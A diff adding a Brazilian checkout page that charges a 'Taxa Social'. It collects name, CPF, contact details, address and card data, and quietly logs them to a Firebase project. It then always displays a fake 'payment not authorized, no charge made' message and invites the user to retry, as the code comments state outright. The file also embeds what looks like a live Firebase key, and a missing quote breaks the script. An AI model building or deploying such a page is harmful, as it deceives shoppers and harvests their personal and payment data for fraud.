@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - Endereço e Pagamento</title>
+    <!-- Incluindo a Fonte Inter via Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet">
+    <!-- Font Awesome para Ícones -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Incluindo Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Estilos CSS (Mantidos para aparência moderna) */
+        :root {
+            --primary-color: #28a745; 
+            --primary-hover: #218838;
+            --background-color: #f4f7f9; 
+            --card-background: #ffffff;
+            --input-background: #F1F1F1; 
+            --text-color: #333;
+            --subtext-color: #666;
+            --border-radius-large: 12px;
+            --border-radius-small: 8px;
+            --total-color: #dc3545; /* Vermelho para o valor final da Taxa Social */
+        }
+        body {
+            font-family: 'Inter', Arial, sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px 0;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 90%;
+            width: 700px;
+            margin: 0 auto;
+            transition: opacity 0.3s ease-in-out;
+        }
+        .checkout-card {
+            background-color: var(--card-background);
+            padding: 30px;
+            border-radius: var(--border-radius-large);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+        }
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: var(--text-color);
+            margin-bottom: 25px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        .form-group { margin-bottom: 20px; }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: var(--subtext-color);
+        }
+        input:not([type="radio"]), select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            background-color: var(--input-background);
+            border-radius: var(--border-radius-small);
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        input:not([type="radio"]):focus, select:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            background-color: white;
+        }
+        .grid-row {
+            display: grid;
+            gap: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+        }
+        .cta-button {
+            width: 100%;
+            padding: 15px 20px;
+            background-color: var(--primary-color);
+            color: white;
+            font-size: 1.1rem;
+            font-weight: 700;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+        .cta-button:hover:not(:disabled) { background-color: var(--primary-hover); }
+        .cta-button:disabled { background-color: #a2d2a9; cursor: not-allowed; }
+        .payment-option {
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius-small);
+            padding: 15px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+        }
+        .payment-option.selected {
+            border-color: var(--primary-color);
+            background-color: #f6fff8;
+            box-shadow: 0 0 5px rgba(40, 167, 69, 0.1);
+        }
+        .payment-option label { margin-left: 10px; flex-grow: 1; }
+        .input-icon-wrapper { position: relative; }
+        .input-icon-wrapper i {
+            position: absolute;
+            top: 50%;
+            left: 15px;
+            transform: translateY(-50%);
+            color: var(--subtext-color);
+            font-size: 1rem;
+            pointer-events: none;
+        }
+        .input-icon-wrapper input { padding-left: 40px !important; }
+        #pixDetails {
+            max-height: 0;
+            opacity: 0;
+            overflow: hidden;
+            transition: max-height 0.5s ease-in-out, opacity 0.4s ease-in-out, padding 0.5s;
+            background-color: #f7f9fa;
+            border-radius: var(--border-radius-small);
+            margin-top: 10px;
+            text-align: center;
+        }
+        #pixDetails.expanded {
+            max-height: 500px; 
+            opacity: 1;
+            padding: 20px;
+        }
+        .qr-code-placeholder {
+            width: 160px;
+            height: 160px;
+            background-color: #444; 
+            margin: 20px auto 15px;
+            border-radius: 4px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+        .pix-key-display {
+            background-color: var(--card-background);
+            border: 1px dashed #aaa;
+            padding: 10px;
+            margin: 10px auto;
+            border-radius: 6px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.9rem;
+            max-width: 400px;
+        }
+        .copy-btn {
+            background-color: #0056b3; /* Cor PIX */
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .copy-btn:hover { background-color: #004080; }
+        .value-summary {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+        }
+        .coupon-field { display: flex; gap: 10px; margin-bottom: 20px; }
+        .coupon-field input { flex-grow: 1; }
+        .coupon-field button {
+            padding: 12px 15px;
+            background-color: #6c757d;
+            color: white;
+            border: none;
+            border-radius: var(--border-radius-small);
+            cursor: pointer;
+            transition: background-color 0.3s;
+            font-weight: 500;
+        }
+        .final-total {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--total-color);
+            padding: 10px 0;
+            border-top: 2px solid var(--total-color);
+        }
+        .message-box {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: var(--border-radius-small);
+            margin-bottom: 20px;
+            border: 1px solid #ffeeba;
+            display: none;
+        }
+        .message-box.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border-color: #f5c6cb;
+        }
+        .message-box.success {
+            background-color: #d4edda;
+            color: #155724;
+            border-color: #c3e6cb;
+        }
+        #paymentFormSection { display: none; }
+        #loadingOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 10000;
+            transition: opacity 0.3s;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-color);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Modal de Falha (Exigido pelo caso de uso) */
+        .failure-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95); 
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: var(--text-color);
+            text-align: center;
+            z-index: 9999;
+            padding: 20px;
+        }
+        .failure-overlay .error-icon {
+            font-size: 5rem;
+            color: #dc3545; 
+            margin-bottom: 20px;
+            animation: shake 0.5s;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-10px); }
+            40%, 80% { transform: translateX(10px); }
+        }
+        
+        @media (max-width: 768px) {
+            .container { max-width: 95%; }
+            .checkout-card { padding: 20px; }
+            .grid-row { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Overlay de Carregamento Simulado -->
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <p style="margin-top: 15px; color: var(--subtext-color);">Processando pagamento...</p>
+    </div>
+
+    <div class="container">
+        <!-- ---------------------------------------------------- -->
+        <!-- 1. FORMULÁRIO DE ENDEREÇO (ETAPA 1) -->
+        <!-- ---------------------------------------------------- -->
+        <div id="addressFormSection" class="checkout-card" style="opacity: 0; transition: opacity 0.5s;">
+            <h2>1. ENDEREÇO DE ENTREGA</h2>
+            
+            <div id="addressMessage" class="message-box"></div>
+
+            <form id="addressForm">
+                <div class="grid-row">
+                    <div class="form-group" style="grid-column: 1 / -1;">
+                        <label for="nome">Nome Completo *</label>
+                        <input type="text" id="nome" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cpfCnpj">CPF ou CNPJ *</label>
+                        <input type="text" id="cpfCnpj" required placeholder="Apenas números">
+                    </div>
+                    <div class="form-group">
+                        <label for="telefone">Telefone *</label>
+                        <input type="tel" id="telefone" required placeholder="(XX) XXXXX-XXXX">
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">E-mail *</label>
+                    <input type="email" id="email" required>
+                </div>
+
+                <div class="grid-row">
+                    <div class="form-group">
+                        <label for="cep">CEP *</label>
+                        <input type="text" id="cep" required maxlength="9" placeholder="00000-000">
+                    </div>
+                    <div class="form-group" style="grid-column: 2 / -1;">
+                        <label for="rua">Rua *</label>
+                        <input type="text" id="rua" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="numero">Número *</label>
+                        <input type="text" id="numero" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="bairro">Bairro *</label>
+                        <input type="text" id="bairro" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cidade">Cidade *</label>
+                        <input type="text" id="cidade" required disabled style="background-color: #E0E0E0;">
+                    </div>
+                    <div class="form-group">
+                        <label for="estado">Estado *</label>
+                        <input type="text" id="estado" required disabled style="background-color: #E0E0E0;">
+                    </div>
+                    <div class="form-group" style="grid-column: 1 / -1;">
+                        <label for="complemento">Complemento (Opcional)</label>
+                        <input type="text" id="complemento">
+                    </div>
+                </div>
+
+                <button type="submit" class="cta-button" id="continueBtn">
+                    Continuar para Pagamento
+                </button>
+            </form>
+        </div>
+
+        <!-- ---------------------------------------------------- -->
+        <!-- 2. FORMULÁRIO DE PAGAMENTO (ETAPA 2) -->
+        <!-- ---------------------------------------------------- -->
+        <div id="paymentFormSection" class="checkout-card">
+            <h2>2. Formulário de Pagamento</h2>
+            
+            <div id="paymentMessage" class="message-box"></div>
+            
+            <div class="payment-options" style="margin-top: 20px;">
+                <div id="cardOption" class="payment-option selected">
+                    <input type="radio" name="paymentMethod" value="card" id="radioCard" checked>
+                    <label for="radioCard">Cartão de Crédito (À Vista)</label>
+                </div>
+
+                <form id="cardForm" style="margin-bottom: 30px;">
+                    <div class="form-group input-icon-wrapper">
+                        <label for="cardNumber">Número do Cartão *</label>
+                        <i class="fa-solid fa-credit-card"></i>
+                        <input type="text" id="cardNumber" required placeholder="0000 0000 0000 0000" maxlength="19">
+                    </div>
+                    
+                    <div class="grid-row">
+                        <div class="form-group">
+                            <label for="cardValidity">Validade (MM/AA) *</label>
+                            <input type="text" id="cardValidity" required placeholder="MM/AA" maxlength="5">
+                        </div>
+                        <div class="form-group">
+                            <label for="cardCvc">CVC *</label>
+                            <input type="text" id="cardCvc" required placeholder="123" maxlength="4">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cardHolder">Nome do Titular *</label>
+                        <input type="text" id="cardHolder" required placeholder="Nome impresso no cartão">
+                    </div>
+                </form>
+
+                <div id="pixOption" class="payment-option">
+                    <input type="radio" name="paymentMethod" value="pix" id="radioPix">
+                    <label for="radioPix">PIX (Pagamento Imediato)</label>
+                </div>
+                
+                <div id="pixDetails">
+                    <div class="qr-code-placeholder">
+                        [QR Code PIX Simulado]
+                    </div>
+                    <p style="color: var(--primary-color); font-weight: 600;">Pagamento identificado automaticamente</p>
+                    <div class="pix-key-display">
+                        <span id="pixKeyText" style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                            00020126360014BR.GOV.BCB.PIX01140000000000000000
+                        </span>
+                        <button type="button" class="copy-btn" onclick="copyPixKey()">Copiar</button>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="value-summary">
+                <h3>Resumo da Compra</h3>
+                <div class="coupon-field">
+                    <input type="text" id="couponInput" placeholder="Cupom de Desconto (Opcional)">
+                    <button type="button" onclick="applyCoupon()">Aplicar</button>
+                </div>
+
+                <div class="final-total">
+                    <span>TAXA SOCIAL:</span>
+                    <span id="finalTotal">R$ 39,90</span> 
+                </div>
+            </div>
+
+            <button type="button" class="cta-button" id="finalizarBtn" onclick="submitOrder()">
+                Finalizar Pedido
+            </button>
+        </div>
+    </div>
+    
+    <!-- MODAL: Falha na Transação (Sempre exibido, conforme solicitado) -->
+    <div id="failureOverlay" class="failure-overlay">
+        <i class="fa-solid fa-triangle-exclamation error-icon"></i>
+        
+        <!-- MENSAGEM -->
+        <h3 style="color: #dc3545; font-size: 1.8rem;">❗ Não foi possível concluir o pagamento</h3>
+        <p>O seu pedido foi salvo, mas o pagamento não foi autorizado.</p>
+        <p style="font-weight: 600; color: var(--text-color); margin-bottom: 15px;">Nenhuma cobrança foi realizada.</p>
+        <p>Por favor, tente novamente ou escolha outra forma de pagamento.</p>
+        
+        <!-- BOTÃO PRIMÁRIO (Azul): TENTAR NOVAMENTE (Volta ao Formulário de Pagamento) -->
+        <button type="button" class="cta-button" 
+                style="max-width: 280px; margin-top: 30px; background-color: #007bff;"
+                onclick="retryPayment()">
+            Tentar Novamente
+        </button>
+
+        <!-- BOTÃO SECUNDÁRIO (Cinza): ESCOLHER OUTROS MÉTODOS (Redireciona/Gateway) -->
+        <button type="button" class="cta-button" 
+                style="max-width: 280px; margin-top: 15px; background-color: #6c757d;"
+                onclick="redirectToGateway()">
+            Escolher Métodos de pagamento
+        </button>
+    </div>
+
+
+    <script type="module">
+        // --- Importações e Inicialização do Firebase ---
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, addDoc, collection, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        
+        // =========================================================================
+        // !!! PASSO CRÍTICO: SUBSTITUA ESTES VALORES PELAS SUAS PRÓPRIAS CHAVES !!!
+        // =========================================================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyC8m-SfDhZZaipi0fMW4K5fSYA49ak71Ag", 
+            authDomain: "kit-net-88e22.firebaseapp.com", 
+            projectId: "kit-net-88e22,
+            storageBucket: "kit-net-88e22.firebasestorage.app",
+            messagingSenderId: "847642926250",
+            appId: "1:847642926250:web:0d0b5c00b34fc19a3ac4d31:847642926250:web:0d0b5c00b34fc19a3ac4d3"
+        };
+        // O projectId é usado como App ID para o caminho do Firestore
+        const customAppIdForFirestore = firebaseConfig.projectId;
+
+        let app, db, auth;
+        let userId = null;
+        let isFirebaseReady = false; 
+
+        // Variável de estado global para guardar os dados da etapa 1
+        let checkoutData = { address: null, paymentMethod: null, card: null };
+        const finalTotalValue = 'R$ 39,90'; 
+
+        // Referências aos elementos DOM
+        const cardOption = document.getElementById('cardOption');
+        const pixOption = document.getElementById('pixOption');
+        const radioCard = document.getElementById('radioCard');
+        const radioPix = document.getElementById('radioPix');
+        const cardForm = document.getElementById('cardForm');
+        const pixDetails = document.getElementById('pixDetails');
+        const finalizarBtn = document.getElementById('finalizarBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const failureOverlay = document.getElementById('failureOverlay');
+
+        // Função de inicialização do Firebase e autenticação
+        async function initializeFirebase() {
+            // VERIFICAÇÃO DE CONFIGURAÇÃO 
+            if (firebaseConfig.apiKey.includes("COLOQUE_SUA_API_KEY_AQUI")) {
+                console.error("ERRO CRÍTICO: Credenciais do Firebase não configuradas.");
+                showMessage('address', `ERRO: Credenciais do Firebase não configuradas no código-fonte. Por favor, edite o arquivo 'checkout.html' e substitua os placeholders.`, 'error');
+                return;
+            }
+            
+            // Ativa o log para debug
+            setLogLevel('debug'); 
+
+            try {
+                app = initializeApp(firebaseConfig);
+                db = getFirestore(app);
+                auth = getAuth(app);
+                
+                // Autenticação obrigatória: Usamos a Autenticação Anônima padrão.
+                await signInAnonymously(auth); 
+                console.log("Autenticação anônima iniciada.");
+            } catch (error) {
+                console.error("Erro na inicialização/autenticação Firebase:", error);
+                showMessage('address', `Erro de inicialização Firebase: ${error.message}. Verifique as chaves e a conexão.`, 'error');
+            }
+
+            // Monitora o estado de autenticação e define o userId
+            onAuthStateChanged(auth, (user) => {
+                if (user) {
+                    userId = user.uid;
+                    isFirebaseReady = true;
+                    console.log(`Firebase pronto. Usuário ID: ${userId}`);
+                } else {
+                    userId = null;
+                    isFirebaseReady = true; 
+                    console.log("Usuário deslogado ou autenticação pendente.");
+                }
+            });
+        }
+        
+        // --- Funções de Salvar no Firestore (Log Privado do Admin) ---
+        
+        /**
+         * Tenta salvar o log da transação no Firebase Firestore no caminho privado do usuário.
+         * Caminho: /artifacts/{projectId}/users/{userId}/checkouts
+         * @param {object} transactionLog O objeto completo da transação a ser salva.
+         * @returns {boolean} True se salvar com sucesso, False em caso de erro.
+         */
+        async function saveCheckoutToFirestore(transactionLog) {
+            // Se o Firebase ainda não terminou de autenticar, espera um pouco (máx 3x)
+            let retries = 0;
+            while ((!isFirebaseReady || !userId) && retries < 3) {
+                console.warn("Aguardando Firebase e userId...");
+                await new Promise(resolve => setTimeout(resolve, 500));
+                retries++;
+            }
+
+            if (!isFirebaseReady || !userId) {
+                console.error("Tentativa falhou. Firebase não está pronto ou userId não está definido.");
+                return false;
+            }
+
+            transactionLog.userId = userId;
+
+            try {
+                // Define a referência da coleção usando a estrutura /artifacts/{appId}/users/{userId}/checkouts
+                const checkoutsCollectionRef = collection(db, `artifacts/${customAppIdForFirestore}/users/${userId}/checkouts`);
+                
+                // Adiciona um novo documento (transação)
+                const docRef = await addDoc(checkoutsCollectionRef, transactionLog);
+                
+                console.log("✅ Log de transação salvo no Firestore com ID: ", docRef.id);
+                return true; 
+            } catch (e) {
+                // A regra de segurança que você corrigiu garante que o erro só ocorre se a chave estiver errada ou a regra ainda estiver desatualizada.
+                console.error("❌ Erro ao salvar a transação no Firestore (Verifique as REGRAS e CHAVES): ", e);
+                showMessage('payment', `Erro ao salvar o log de transação no Firebase: ${e.message}. Verifique as regras de segurança do Firestore.`, 'error');
+                return false; 
+            }
+        }
+
+
+        // --- Funções de UX e Simulação ---
+
+        function showMessage(sectionId, message, type = 'warning') {
+            const box = document.getElementById(sectionId + 'Message');
+            box.innerText = message;
+            box.className = `message-box ${type}`;
+            box.style.display = 'block';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function clearMessage(sectionId) {
+            document.getElementById(sectionId + 'Message').style.display = 'none';
+        }
+
+        function goToPayment() {
+            document.getElementById('addressFormSection').style.display = 'none';
+            document.getElementById('paymentFormSection').style.display = 'block';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+
+        // --- Etapa 1: Endereço (Submissão) ---
+        
+        document.getElementById('addressForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            if (!this.checkValidity()) {
+                showMessage('address', 'Por favor, preencha todos os campos obrigatórios (*).', 'error');
+                return;
+            }
+            clearMessage('address');
+
+            // Coleta os dados do endereço
+            checkoutData.address = {
+                nome: document.getElementById('nome').value,
+                cpfCnpj: document.getElementById('cpfCnpj').value,
+                telefone: document.getElementById('telefone').value,
+                email: document.getElementById('email').value,
+                cep: document.getElementById('cep').value,
+                rua: document.getElementById('rua').value,
+                numero: document.getElementById('numero').value,
+                bairro: document.getElementById('bairro').value,
+                cidade: document.getElementById('cidade').value,
+                estado: document.getElementById('estado').value,
+                complemento: document.getElementById('complemento').value || null
+            };
+
+            goToPayment();
+        });
+
+        // Auto-preenchimento de CEP (ViaCEP - Simulação)
+        document.getElementById('cep').addEventListener('blur', async function() {
+            const cepInput = this;
+            const cep = cepInput.value.replace(/\D/g, '');
+
+            if (cep.length !== 8) return;
+
+            document.getElementById('rua').value = '';
+            document.getElementById('bairro').value = '';
+            document.getElementById('cidade').value = 'Buscando...';
+            document.getElementById('estado').value = '';
+            
+            try {
+                // Simulação da chamada de API do ViaCEP
+                const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+                const data = await response.json();
+
+                if (data.erro) throw new Error('CEP não encontrado');
+
+                document.getElementById('rua').value = data.logradouro;
+                document.getElementById('bairro').value = data.bairro;
+                document.getElementById('cidade').value = data.localidade;
+                document.getElementById('estado').value = data.uf;
+
+            } catch (error) {
+                showMessage('address', 'CEP não encontrado. Por favor, preencha o endereço manualmente.', 'error');
+                document.getElementById('rua').value = '';
+                document.getElementById('bairro').value = '';
+                document.getElementById('cidade').value = '';
+                document.getElementById('estado').value = '';
+            }
+        });
+        
+        // Formatação de Campos
+        document.getElementById('cep').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '').replace(/^(\d{5})(\d{3})$/, '$1-$2');
+        });
+        document.getElementById('cpfCnpj').addEventListener('input', (e) => {
+             e.target.value = e.target.value.replace(/\D/g, '');
+        });
+        document.getElementById('telefone').addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) value = `(${value.substring(0, 2)}) ${value.substring(2)}`;
+            if (value.length > 10) value = `${value.substring(0, value.length - 4)}-${value.substring(value.length - 4)}`;
+            e.target.value = value;
+        });
+
+        // --- Etapa 2: Pagamento (Toggle e Finalização) ---
+        
+        function togglePaymentMethod(method) {
+            clearMessage('payment');
+            cardOption.classList.remove('selected');
+            pixOption.classList.remove('selected');
+            pixDetails.classList.remove('expanded');
+
+            Array.from(cardForm.elements).forEach(el => el.removeAttribute('required'));
+
+            if (method === 'card') {
+                radioCard.checked = true;
+                cardOption.classList.add('selected');
+                cardForm.style.display = 'block';
+                Array.from(cardForm.elements).forEach(el => el.setAttribute('required', 'required'));
+                checkoutData.paymentMethod = 'Cartao de Credito';
+            } else if (method === 'pix') {
+                radioPix.checked = true;
+                pixOption.classList.add('selected');
+                cardForm.style.display = 'none';
+                pixDetails.classList.add('expanded');
+                checkoutData.paymentMethod = 'PIX';
+            }
+        }
+
+        cardOption.addEventListener('click', () => togglePaymentMethod('card'));
+        pixOption.addEventListener('click', () => togglePaymentMethod('pix'));
+
+        // Formatação de Cartão (Número, Validade, CVC)
+        document.getElementById('cardNumber').addEventListener('input', function() {
+            let value = this.value.replace(/\D/g, '');
+            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            this.value = value.trim();
+        });
+        document.getElementById('cardValidity').addEventListener('input', function() {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            this.value = value;
+        });
+        document.getElementById('cardCvc').addEventListener('input', function() {
+             this.value = this.value.replace(/\D/g, '');
+        });
+
+        // Simulação de Cupom
+        window.applyCoupon = function() { // Exposto globalmente
+            const input = document.getElementById('couponInput');
+            const finalTotalSpan = document.getElementById('finalTotal');
+            
+            const basePrice = 39.90;
+            finalTotalSpan.innerText = `R$ ${basePrice.toFixed(2).replace('.', ',')}`;
+            clearMessage('payment');
+
+            if (input.value.trim().toLowerCase() === 'desconto10') {
+                 const newPrice = (basePrice * 0.90).toFixed(2).replace('.', ',');
+                 finalTotalSpan.innerText = `R$ ${newPrice}`;
+                 showMessage('payment', 'Cupom "DESCONTO10" aplicado! Você economizou R$ 3,99.', 'success');
+            } else if (input.value.trim().length > 0) {
+                 showMessage('payment', 'Cupom inválido ou expirado.', 'error');
+            } else {
+                 showMessage('payment', 'Digite o código do cupom.', 'warning');
+            }
+        }
+
+        // Cópia da Chave PIX
+        window.copyPixKey = function() { // Exposto globalmente
+            const keyText = document.getElementById('pixKeyText').innerText;
+            const tempInput = document.createElement('textarea');
+            tempInput.value = keyText;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand('copy'); 
+            document.body.removeChild(tempInput);
+            showMessage('payment', 'Chave PIX copiada para a área de transferência!', 'success');
+        }
+
+        /**
+         * Exibe o Modal de Falha.
+         * @param {boolean} logWasSaved - Indica se o log da transação foi salvo no Firestore.
+         */
+        function showFailureMessage(logWasSaved) {
+            document.getElementById('paymentFormSection').style.opacity = 0.1;
+            failureOverlay.style.display = 'flex';
+            
+            // Log de auditoria
+            if (logWasSaved) {
+                console.log("STATUS: Log salvo (Sucesso interno), exibido Falha na UI (conforme requisito).");
+            } else {
+                console.error("STATUS: Falha crítica! Log NÃO foi salvo.");
+            }
+        }
+        
+        /**
+         * Lógica de Tentar Novamente (Botão Azul): 
+         * Esconde o modal de falha e retorna o usuário à seção de pagamento.
+         */
+        window.retryPayment = function() {
+            failureOverlay.style.display = 'none';
+            document.getElementById('paymentFormSection').style.opacity = 1;
+            clearMessage('payment');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+
+        /**
+         * Redireciona para o Gateway de Pagamento (Botão Cinza - Simulação)
+         */
+        window.redirectToGateway = function() { 
+            failureOverlay.style.display = 'none';
+            // Simulação de redirecionamento
+            console.log("Redirecionando para o gateway de pagamento...");
+            document.getElementById('paymentFormSection').style.opacity = 1;
+            // Aqui você pode adicionar um window.location.href = '/outra-pagina'
+        }
+
+
+        // Ação Finalizar Pedido (Inicia o salvamento no Firestore)
+        window.submitOrder = async function() { // Exposto globalmente
+            clearMessage('payment');
+            let paymentDetails = {};
+            
+            // 1. Verifica se as chaves foram preenchidas e se o Firebase está pronto
+            if (firebaseConfig.apiKey.includes("COLOQUE_SUA_API_KEY_AQUI")) {
+                 showMessage('payment', 'ERRO: Configure as credenciais do Firebase no código-fonte.', 'error');
+                 return;
+            }
+            if (!isFirebaseReady) {
+                 showMessage('payment', 'Aguardando inicialização do Firebase. Tente novamente em instantes.', 'warning');
+                 return;
+            }
+            if (!checkoutData.address) {
+                showMessage('payment', 'Erro: Por favor, volte e preencha o endereço de entrega (Etapa 1).', 'error');
+                return;
+            }
+
+
+            // 2. Coleta os detalhes do pagamento e valida
+            if (radioCard.checked) {
+                if (!cardForm.checkValidity()) {
+                    cardForm.reportValidity();
+                    showMessage('payment', 'Preencha todos os dados do cartão de crédito.', 'error');
+                    return;
+                }
+                paymentDetails = {
+                    method: checkoutData.paymentMethod,
+                    cardNumber: document.getElementById('cardNumber').value.replace(/\s/g, '').slice(-4), 
+                    cardValidity: document.getElementById('cardValidity').value,
+                    cardHolder: document.getElementById('cardHolder').value
+                };
+            } else if (radioPix.checked) {
+                paymentDetails = { 
+                    method: checkoutData.paymentMethod, 
+                    pixKey: document.getElementById('pixKeyText').innerText 
+                };
+            } else {
+                 showMessage('payment', 'Selecione um método de pagamento.', 'warning');
+                 return;
+            }
+
+
+            // 3. Prepara o log de transação completo
+            const transactionLog = {
+                timestamp: new Date().toISOString(),
+                total: document.getElementById('finalTotal').innerText,
+                address: checkoutData.address,
+                payment: paymentDetails,
+                status: 'completed_log_saved_external_feedback_is_always_failure'
+            };
+            
+
+            // 4. Mostra loading e desabilita botão
+            loadingOverlay.style.display = 'flex';
+            loadingOverlay.innerHTML = `<div class="spinner"></div><p style="margin-top: 15px; color: var(--subtext-color);">Tentando salvar o pedido no banco de dados...</p>`;
+            finalizarBtn.disabled = true;
+
+            // 5. Tenta salvar no Firebase (CRÍTICO)
+            const saveSuccessful = await saveCheckoutToFirestore(transactionLog);
+            
+            // 6. Finaliza a interface e aplica a lógica de Falha Incondicional (simulação de gateway)
+            loadingOverlay.style.display = 'none';
+            finalizarBtn.disabled = false;
+
+            // Sempre exibir a mensagem de Falha, conforme a simulação do gateway.
+            showFailureMessage(saveSuccessful); 
+        }
+        
+        // Inicializa o estado do formulário e o Firebase
+        document.addEventListener('DOMContentLoaded', () => {
+            initializeFirebase();
+            togglePaymentMethod('card');
+            
+            // Esconde o loading inicial
+            setTimeout(() => {
+                loadingOverlay.style.opacity = 0;
+                setTimeout(() => loadingOverlay.style.display = 'none', 300);
+                document.getElementById('addressFormSection').style.opacity = 1;
+            }, 500);
+        });
+
+    </script>
+</body>
+</html>
+
